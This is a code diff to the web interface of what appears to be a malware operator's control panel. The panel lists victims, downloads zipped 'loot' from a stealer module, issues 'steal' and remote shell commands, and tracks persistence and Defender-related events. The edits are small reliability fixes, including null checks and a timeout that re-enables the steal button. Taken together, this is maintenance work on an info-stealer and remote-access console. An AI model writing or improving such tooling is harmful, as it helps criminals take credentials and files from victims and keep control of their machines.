@@ -410,7 +410,7 @@ function handleLoot(entry, fromHistory) {
     appendOut('overview', entry.preview || '');
   } else if (t === 'steal_zip' && entry.file) {
     const ts = Date.now();
-    document.getElementById('steal-links').innerHTML =
+    const _sl = document.getElementById('steal-links'); if (_sl) _sl.innerHTML =
       `<a class="cmd primary" href="/api/loot_file/${currentVid}/${entry.file}?t=${ts}" download>Download ZIP</a>
        <button class="cmd sm" onclick="previewCqmFromZip('${entry.file}')">CQM tip</button>`;
     appendOut('stealer', 'ready · ' + entry.file + ' · ' + new Date().toLocaleTimeString());
@@ -427,6 +427,13 @@ function handleLoot(entry, fromHistory) {
     appendOut('overview', msg);
     // route by keyword
     const m = msg.toLowerCase();
+    if (m.includes('steal')) {
+      appendOut('stealer', msg);
+      if (m.includes('complete') || m.includes('steal_zip') || m.includes('bytes=')) {
+        const btn = document.getElementById('btn-steal');
+        if (btn) btn.disabled = false;
+      }
+    }
     if (m.includes('killed')) appendOut('process', msg);
     if (m.includes('watchdog') || m.includes('persist') || m.includes('startup') || m.includes('defender') || m.includes('usb'))
       appendOut('persist', msg);
@@ -563,6 +570,8 @@ function runSteal() {
   const btn = document.getElementById('btn-steal');
   if (btn) btn.disabled = true;
   send('steal');
+  // re-enable if no zip within 90s so UI never stays dead
+  setTimeout(() => { if (btn) btn.disabled = false; }, 90000);
 }
 
 function runShell(ps) {
